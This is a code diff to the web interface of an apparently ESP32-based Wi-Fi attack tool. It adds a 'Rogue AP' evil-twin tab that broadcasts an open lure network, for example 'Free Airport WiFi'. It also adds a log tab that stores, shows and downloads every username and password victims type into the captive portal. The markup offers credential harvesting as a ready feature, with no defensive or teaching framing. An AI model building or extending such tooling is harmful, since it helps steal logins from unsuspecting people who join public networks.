@@ -125,6 +125,18 @@
     </div>
     <span class="nav-label">Attack</span>
   </button>
+  <button class="nav-item" data-tab="rogue" onclick="switchTab('rogue')">
+    <div class="nav-indicator">
+      <img src="/icons/wifi.png" class="nav-icon" alt="">
+    </div>
+    <span class="nav-label">Rogue AP</span>
+  </button>
+  <button class="nav-item" data-tab="log" onclick="switchTab('log'); loadEvilTwinLog();">
+    <div class="nav-indicator">
+      <img src="/icons/eye.png" class="nav-icon" alt="">
+    </div>
+    <span class="nav-label">Log</span>
+  </button>
   <button class="nav-item" data-tab="settings" onclick="switchTab('settings')">
     <div class="nav-indicator">
       <img src="/icons/settings.png" class="nav-icon" alt="">
@@ -409,6 +421,110 @@
             </button>
           </div>
 
+        </div>
+      </div>
+    </div>
+
+  </section>
+
+
+
+  <!-- Rogue AP (custom-name Evil Twin) -->
+  <section id="tab-rogue" class="tab-panel">
+
+    <div class="info-box info-warn">
+      <div class="info-label">
+        <img src="/icons/warning.png" class="info-label-icon" alt="">
+        Custom-Name Evil Twin (Rogue AP)
+      </div>
+      Broadcasts an <strong>open</strong> Wi-Fi network with a name you choose, that does
+      <strong>not</strong> imitate any nearby network. There is no real network to attack,
+      so no deauth and no password verification happen — every credential typed into the
+      captive portal is simply saved to the Log. It keeps capturing until you stop it.
+    </div>
+
+    <div class="info-box info-warn">
+      <div class="info-label">
+        <img src="/icons/tips.png" class="info-label-icon" alt="">
+        How to stop it
+      </div>
+      While the rogue AP is up, this management network is offline, so this page will
+      disconnect. To stop it, connect a phone to your rogue network
+      (<code id="rogue-stop-ssid">the SSID you chose</code>) and open
+      <code>http://192.168.4.1/hydra-admin-stop</code>. The device then returns here and you
+      can review captures in the <strong>Log</strong> tab.
+    </div>
+
+    <div class="card">
+      <div class="card-header"><h3>Launch Rogue AP</h3></div>
+      <div class="card-body">
+        <div class="form-row">
+          <label class="form-label" for="rogue-ssid">Network Name (SSID)</label>
+          <input type="text" id="rogue-ssid" placeholder="e.g. Free Airport WiFi" maxlength="32" autocomplete="off"
+                 oninput="var e=document.getElementById('rogue-stop-ssid'); if(e) e.textContent=this.value||'the SSID you chose';">
+        </div>
+        <div style="margin-top:24px;">
+          <button onclick="launchCustomTwin()" class="btn-primary full-width">
+            <img src="/icons/wifi.png" style="width:18px; height:18px; filter:brightness(10);" alt="">
+            Launch &amp; Start Capturing
+          </button>
+        </div>
+      </div>
+    </div>
+
+  </section>
+
+
+
+  <!-- Captive Portal Log -->
+  <section id="tab-log" class="tab-panel">
+
+    <div class="info-box info-warn">
+      <div class="info-label">
+        <img src="/icons/tips.png" class="info-label-icon" alt="">
+        Captive Portal Log
+      </div>
+      Every username and password submitted through an Evil Twin captive portal is saved to
+      the ESP32's internal flash (SPIFFS), so it survives reboots and power loss with no
+      internet connection required.
+    </div>
+
+    <div class="card">
+      <div class="card-header">
+        <h3>Captured Credentials</h3>
+        <span id="log-count-badge" class="badge">0 entries</span>
+      </div>
+      <div class="card-body" style="padding:0;">
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Uptime</th>
+                <th>SSID</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Status</th>
+              </tr>
+            </thead>
+            <tbody id="eviltwin-log-list">
+              <tr><td colspan="5" class="table-empty-msg">Loading…</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="card-footer" style="display:flex; gap:8px; flex-wrap:wrap;">
+          <button onclick="loadEvilTwinLog()" class="btn-secondary">
+            <img src="/icons/refresh.png" class="btn-icon" alt="">
+            Refresh
+          </button>
+          <a class="btn-secondary" style="text-decoration:none;display:inline-flex;align-items:center;gap:6px;"
+             href="http://192.168.4.1/eviltwin-log" download="eviltwin_log.txt">
+            <img src="/icons/download.png" class="btn-icon" alt="">
+            Download
+          </a>
+          <button onclick="clearEvilTwinLog()" class="btn-secondary">
+            <img src="/icons/close.png" class="btn-icon" alt="">
+            Clear Log
+          </button>
         </div>
       </div>
     </div>
